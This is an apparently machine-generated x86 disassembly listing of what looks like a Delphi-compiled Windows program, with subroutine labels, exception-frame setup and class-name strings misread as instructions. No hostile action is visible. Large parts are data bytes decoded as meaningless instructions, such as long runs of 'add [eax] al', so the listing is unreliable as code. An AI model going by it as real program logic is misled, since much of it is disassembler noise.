add ecx [ eax ]
call [ ecx ]
retn
sub_415214
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_415250
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_405770
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_4152d0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405770
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415344
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41538a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415391
retn
mov eax rw-data
call sub_403eec
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404968
sub_41539c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4153c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4153c8
retn
sub_415ce5
rcr [ ecx + eax * 2 ] 0xcf
pop esp
inc ecx
add cl bl
pop esp
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
in eax 0x5c
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x5d600040 ] cl
inc ecx
add cl dh
pop esp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x5d ] dh
inc ecx
add [ ebp + ebx * 2 + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebp + 0x41 ] 0x0
or al 0x0
add [ eax ] al
and al 0x5c
inc ecx
add [ ebx + esi - 0x72ebffc0 ] ah
inc ecx
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
mov eax [ ecx ]
push esp
mov [ ecx ] es
pop esp
mov [ ecx ] es
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
inc ecx
add [ ebp + ecx * 4 + 0xe0041 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
dec esp
adc [ eax ] eax
add al 0x0
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
and al 0x5c
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc eax
xor eax [ eax ]
or al 0x31
imul esi [ ebx + 0x74 ] 0x9c746e65
pop ebp
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
add [ eax ] ch
xor [ eax ] eax
add [ edi - 0x73abffbf ] cl
inc ecx
add [ esp + ecx * 4 + 0x41 ] bl
add [ eax - 0x75 ] dh
inc ecx
add [ edi + ecx * 4 + 0x41 ] ch
add [ eax + edx * 4 + 0x41 ] cl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ eax + edx * 4 + 0x41 ] bh
add [ eax + edx * 4 + 0x41 ] dh
add al cl
mov es [ ecx ]
add al [ eax ]
insb
pop [ ecx ]
dec esp
nop
inc ecx
imul esi [ ebx + 0x74 ] 0x60746e65
pop ebp
inc ecx
add [ eax + 0x415c ] bl
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
pop esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 2 ] dh
inc ecx
add [ edx + 0x5e ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub_415f0f
push [ edx + edx * 4 - 0x6d47ffbf ]
inc ecx
add ah al
xchg edx eax
inc ecx
add [ eax ] al
xchg ebx eax
inc ecx
add [ ebx ] cl
push esp
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
xor [ edi + 0x41 ] bl
add [ edi ] al
or edx [ ebx + eax * 2 + 0x6f ]
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
int3
sub_41609c
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
or al 0x98
outsb
dec ecx
je r-xdata
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
imul ebp [ esi + 0x67 ] 0x7473694c
mov al 0x61
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ecx
add [ edi + edx * 4 ] al
inc ecx
add [ eax ] bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + 0x41 ] cl
add [ eax - 0x59 ] dl
inc ecx
add [ edi + 0x41 ] dl
add al dh
0xa8c80041 0x41
and al 0xa9
inc ecx
add al bh
test eax 0xa23c0041
inc ecx
add [ edx + ebp * 4 ] dh
inc ecx
add [ eax - 0x33ffbe56 ] ch
movsb [ edi ] [ esi ]
inc ecx
add al bl
movsb [ edi ] [ esi ]
inc ecx
add [ esi + edx * 4 + 0x41 ] cl
add [ ebp + 0x41 ] dh
add [ ebp - 0x59dfffbf ] dh
inc ecx
add [ edx + ebx * 4 - 0x584fffbf ] bl
inc ecx
add [ eax ] dh
popfd
inc ecx
add [ esi + ebx * 4 ] al
inc ecx
add ah ch
cmpsd [ esi ] [ edi ]
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x62 ] ch
inc ecx
add [ esi + ebx * 4 - 0x6097ffbf ] bh
inc ecx
add [ eax ] al
mov eax [ 0xffffffffa1580041 ]
inc ecx
add ah ch
mov eax [ 0xffffffffa53c0041 ]
inc ecx
add [ eax - 0x5b ] bl
inc ecx
add [ eax - 0x58 ] dl
inc ecx
add [ eax + 0x600041a6 ] ah
stosb [ edi ]
inc ecx
add [ eax - 0x56 ] dh
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
cwde
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add [ eax ] al
push ebx
je r-xdata
popad
clc
stosb [ edi ]
inc ecx
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
je r-xdata
add [ eax ] al
lea eax [ eax ]
or [ ecx + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4161 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x30004161 ] ah
add [ eax ] al
add [ edi + ebx * 2 + 0x33a40041 ] cl
inc eax
add [ eax - 0x4bffbfcd ] dh
xor eax [ eax ]
mov eax 0xac004033
xor eax [ eax ]
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
jo r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] ch
inc ecx
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + ebx * 4 ] cl
push ebx
je r-xdata
popad
insd
mov eax eax
or [ ebx + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] ah
inc ecx
add [ eax ] cl
add [ eax ] al
add [ edx + 0x41 ] al
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
adc [ ecx - 0x5507ffbf ] dh
inc ecx
add [ edi + ebp * 4 ] bh
inc ecx
add [ eax - 0x51 ] dl
inc ecx
add al dh
scasb [ edi ]
inc ecx
add [ eax ] al
scasd [ edi ]
inc ecx
add ah bh
stosd [ edi ]
inc ecx
add [ eax ] dl
scasd [ edi ]
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
add [ ebx + ebp * 4 + 0x41 ] al
add [ ebx + ebp * 4 + 0x41 ] bl
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
cld
stosd [ edi ]
inc ecx
add [ eax + 0x70041ac ] al
push esp
push ebx
je r-xdata
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
insd
jl r-xdata
popad
lodsb [ esi ]
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004163 ] bl
add [ eax ] al
add ah dl
popad
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
clc
stosb [ edi ]
inc ecx
add [ ebx + ebp * 4 + 0x41 ] al
add [ ebx + ebp * 4 + 0x41 ] bl
add [ ecx + esi * 4 + 0x41 ] cl
add [ eax - 0x7bffbfd7 ] ch
mov cl 0x41
add [ eax + 0x130041ac ] al
jb r-xdata
jae r-xdata
jns r-xdata
push ebx
je r-xdata
sub [ ecx + eax * 2 + 0x41b27800 ] 0x0
or eax 0x6d654d54
je r-xdata
add [ eax ] dl
scasd [ edi ]
inc ecx
add [ 0x6e614854 ] cl
insb
insd
nop
bound eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
bound eax [ ecx ]
or [ eax ] al
add [ eax ] al
aam 0x61
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
clc
stosb [ edi ]
inc ecx
add [ edi + ebp * 4 ] bh
inc ecx
add [ eax - 0x51 ] dl
inc ecx
add al dh
scasb [ edi ]
inc ecx
add [ eax ] al
scasd [ edi ]
inc ecx
add ah bh
stosd [ edi ]
inc ecx
popad
add [ ebp + 0x62200040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
inc ecx
add [ eax + eax ] al
add [ eax ] al
fcom [ eax ]
inc eax
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
clc
stosb [ edi ]
inc ecx
je r-xdata
outsd
jb r-xdata
insd
popad
insd
clc
arpl [ ecx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ecx + eax * 2 ] ah
adc al 0x0
add [ eax ] al
xor [ ebx + 0x41 ] ah
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
test al 0xb1
inc ecx
add al bh
stosb [ edi ]
inc ecx
add [ edx + esi * 4 + 0x41 ] cl
add [ ebx + ebp * 4 + 0x41 ] bl
add [ ecx + esi * 4 + 0x41 ] cl
add [ ebx + esi * 4 ] al
inc ecx
add [ ecx + esi * 4 - 0x537fffbf ] al
inc ecx
add [ eax - 0x4e ] bh
inc ecx
push ebx
push ebx
add [ 0x6d654d54 ] cl
inc ecx
add [ eax + 0x780041ac ] al
mov dl 0x41
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
popad
insd
mov eax eax
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
add [ ebx + ebp * 4 + 0x41 ] al
add [ ebx + ebp * 4 + 0x41 ] bl
add [ ecx + esi * 4 + 0x41 ] cl
add [ eax ] dl
mov ch 0x41
add [ ecx + esi * 4 - 0x537fffbf ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004164 ] dl
add [ eax ] al
add [ eax ] dh
arpl [ ecx ] ax
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
fdiv [ ecx + eax * 2 + 0x41aaf800 ]
sub_4165f5
push edi
inc eax
add [ eax ] ch
xor [ eax ] eax
or [ 0x15400042 ] dl
inc edx
add [ eax + 0x10004215 ] ch
push ss
inc edx
add [ esi + edx + 0x16f80042 ] dl
inc edx
add al bh
sbb [ edx ] al
add al 0x19
inc edx
add [ eax ] dl
sbb [ edx ] eax
sbb al 0x19
inc edx
add [ eax ] ch
sbb [ edx ] eax
movsb [ edi ] [ esi ]
sbb [ edx ] eax
push cs
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add ah ah
inc cx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax - 0x57ffbe4b ] bl
sub [ eax ] eax
test al 0x29
inc eax
add [ eax + 0x6004029 ] ch
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x41674890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
inc cx
add [ eax ] ch
add [ eax ] al
add al bl
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edi + 0x41 ] 0x0
jl r-xdata
rcr al 0x67
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x66
inc ecx
add [ eax ] bl
add [ eax ] al
add ah cl
adc [ eax ] eax
movsb [ edi ] [ esi ]
xor eax [ eax ]
fcom [ edi + 0x40 ]
add ah ah
push edi
inc eax
add [ eax - 0x53ffbfcd ] bh
xor eax [ eax ]
hlt
mov [ esi + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004166 ] cl
add [ eax ] al
add al bl
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
jl r-xdata
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ ecx + eax * 2 + 0x41b59800 ] bh
add [ eax - 0x3bffbe44 ] dl
mov esp 0xbfd80041
inc ecx
add [ ebp + edi * 4 - 0x211fffbf ] dh
inc ecx
add ah dl
mov ebp 0xdfb00041
inc ecx
add [ eax + 0x140041df ] bl
int 0x41
add [ esi ] cl
add [ eax ] al
cwde
inc cx
add [ ebx + esi + 0x33b00040 ] ah
dec esi
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x67 ] dh
dec eax
inc ecx
inc ecx
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
and al 0x4
inc ecx
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
inc esp
and al 0x4
aam 0xe9
retn
jns r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
je r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
inc ecx
add [ eax + eax ] cl
add [ eax - 0x5bffbe9a ] bl
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
in al 0x41
add [ ebp + 0x41 ] al
add [ esp - 0x1b3bffbf ] bl
inc ecx
add [ eax ] al
in eax 0x41
add al dh
call 0x4f682f
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
sub al 0x0
add [ eax ] al
pop es
push esp
push edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
rcl [ eax + ebp * 2 + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
push 0xc0041
add [ eax ] al
and [ eax + 0x40 ] dh
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
pop es
inc ebp
push esp
push 0x64616572
pushad
push 0xe0a0041
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] ch
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7c004167 ] al
add [ eax ] al
add [ eax - 0x5bffbe9a ] bl
xor eax [ eax ]
mov al 0x33
mov eax [ eax ]
jmp [ eax + 0x28 ]
add [ ebx - 0x2bfbdbbc ] al
mov eax [ esp + 0x4 ]
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e82201
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
aam 0x8b
inc esp
je r-xdata
outsb
outsb
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1
daa
test eax 0x44830000
and al 0x4
fmul [ ebx - 0x74fbdbbc ]
add bh bh
pop ebp
retn 0x4
sub_4169fb
push ecx
push eax
dec esp
or eax 0xdd40042
inc edx
add al bl
or eax 0xdf00042
inc edx
add [ esi + ecx ] ah
inc edx
add ah dh
or eax 0xdfc0042
inc edx
add [ eax ] al
push cs
inc edx
add [ esi + ecx ] cl
inc edx
add [ eax - 0x33ffbdf2 ] bh
push cs
inc edx
add al ch
adc [ edx ] al
clc
or eax 0xddc0042
inc edx
add al cl
or eax 0x11100042
inc edx
add [ edx ] cl
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x6b
outsb
outsb
je r-xdata
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x7c00408d
imul eax [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
imul eax [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
imul eax [ ecx ] 0xffffffcc
imul eax [ ecx ] 0x54
add [ eax ] al
add [ eax + 0x69 ] dl
inc ecx
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
adc al 0x13
inc edx
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + 0xd ] al
inc edx
add [ eax - 0x75 ] dh
inc ecx
add [ eax ] bl
push cs
inc edx
inc edx
add ah al
adc al [ edx ]
adc [ edx + eax * 2 + 0x61 ] dl
jae r-xdata
add [ eax ] al
adc [ eax ] al
std
push eax
push 0x41
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
imul esp [ ebx + 0x41 ] 0x6f697463
outsb
lea eax [ eax ]
loopne r-xdata
inc edx
add [ ebx + edx + 0x10042 ] bh
out dx eax
jmp [ eax + 0xc004213 ]
add [ ebx + edx + 0x42 ] dh
add [ eax ] ch
push cs
arpl [ ecx + 0x63 ] ax
je r-xdata
inc ecx
add [ eax + eax ] dl
add [ eax ] al
fcom [ eax ]
inc eax
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 ] bl
outsb
outsb
je r-xdata
add cl [ ebx - 0x3ca5dbfc ]
nop
inc ecx
add [ edi ] al
or al 0x54
inc edx
popad
jae sub_416c50
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
cmp [ esi ] cl
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add al dl
adc al [ edx ]
xor al 0x14
inc edx
add al bl
adc eax [ edx ]
insb
adc eax [ edx ]
pushfd
adc eax [ edx ]
jo r-xdata
sub [ esi ] cl
outsd
imul eax [ ecx ] r-xdata
add al [ eax ]
pop es
inc ebx
insb
popad
jae r-xdata
arpl [ ecx + 0x63 ] ax
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
and al 0x12
inc edx
add [ eax ] ah
adc al [ edx ]
pop eax
adc al [ edx ]
mov eax 0x8c004212
adc al [ edx ]
mov esp 0xdc004212
adc [ edx ] eax
jo r-xdata
add [ eax - 0x4bffbfcd ] dh
xor eax [ eax ]
mov eax 0xac004033
xor eax [ eax ]
or al 0x31
jae r-xdata
push edi
mov edi ecx
mov esi edx
mov ebx eax
outsd
outsb
jl r-xdata
push 0x80041
add bh bh
sbb [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x4e
popad
insd
push esp
adc [ eax ] al
or al 0x0
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
cld
push 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 + 0x41 ] bl
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
fmul [ ebx - 0x74aff3bb ]
inc ebp
or [ eax - 0x75 ] dl
iretd
inc ecx
add [ edx + ebp * 2 + 0x41 ] cl
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
pop ebx
pop ebp
retn 0x8
jae r-xdata
add [ ebx + 0x416c08c0 ] cl
add [ esi ] cl
push cs
push esp
dec ecx
outsb
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405f50
pop edi
pop esi
or al 0x50
popad
jo r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ebx eax
outsb
je r-xdata
inc ebp
or [ eax - 0x75 ] dl
iretd
jns r-xdata
adc [ eax ] al
add al 0x0
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
sub_416c28
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405f6c
pop edi
pop esi
pop ebx
retn
sub_416c50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405f50
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416c78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405f8c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416d8c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4182a8
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403388
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403388
test al al
je r-xdata
